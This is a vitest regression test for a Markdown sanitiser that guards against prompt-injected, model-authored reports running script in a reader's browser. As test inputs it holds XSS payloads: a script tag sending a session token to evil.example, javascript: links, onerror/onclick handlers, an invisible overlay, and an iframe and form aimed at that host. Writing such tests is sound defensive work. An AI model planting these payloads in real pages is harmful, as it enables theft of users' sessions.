// @vitest-environment jsdom
/**
 * Sanitiser regression (threat model T003): everything model-authored is
 * rendered through renderMarkdown, so this is the single control between a
 * prompt-injected report and script execution in a reader's browser.
 * Needs a DOM: jsdom, the environment DOMPurify itself is tested against
 * (happy-dom reports isSupported but mis-parses and lets <script> through).
 */
import { describe, expect, it } from 'vitest';
import { renderMarkdown } from './Markdown';

describe('renderMarkdown sanitisation', () => {
  it('strips script, event handlers, javascript: URLs, and style from inline HTML', () => {
    const hostile = [
      'Revenue grew <script>fetch("https://evil.example/?t=" + sessionStorage.token)</script>12%.',
      '<a href="javascript:alert(1)" onclick="steal()">source</a>',
      '<img src="x" onerror="steal()">',
      '<ins style="position:fixed;inset:0;opacity:0">o</ins>',
      '<iframe src="https://evil.example"></iframe>',
      '<form action="https://evil.example"><button>Save</button></form>',
    ].join('\n\n');
    const html = renderMarkdown(hostile);
    expect(html).not.toMatch(/<script/i);
    expect(html).not.toMatch(/<[^>]*\son\w+\s*=/i); // onclick, onerror, … as attributes
    expect(html).not.toMatch(/javascript:/i);
    expect(html).not.toMatch(/style\s*=/i);
    expect(html).not.toMatch(/<iframe/i);
    expect(html).not.toMatch(/<form|<button/i);
    // The surrounding legitimate content is still there.
    expect(html).toContain('Revenue grew');
    expect(html).toContain('12%');
    expect(html).toContain('source');
  });

  it('keeps the review diff markup (<del>/<ins>) and ordinary markdown', () => {
    const html = renderMarkdown('Revenue grew **<del>12</del><ins>14</ins>%** in Q2.');
    expect(html).toContain('<strong><del>12</del><ins>14</ins>%</strong>');
    const table = renderMarkdown('| Risk | Evidence |\n|---|---|\n| a | b |');
    expect(table).toContain('<table>');
    expect(table).toContain('<td>a</td>');
  });

  it('neutralises markdown-native vectors too (link and image URLs)', () => {
    const html = renderMarkdown('[click](javascript:alert(1)) ![x](javascript:steal())');
    expect(html).not.toMatch(/javascript:/i);
    // No attribute on any tag may be an event handler (text content may
    // legitimately contain the word).
    expect(html).not.toMatch(/<[^>]*\son\w+\s*=/i);
    expect(html).toContain('click');
  });
});
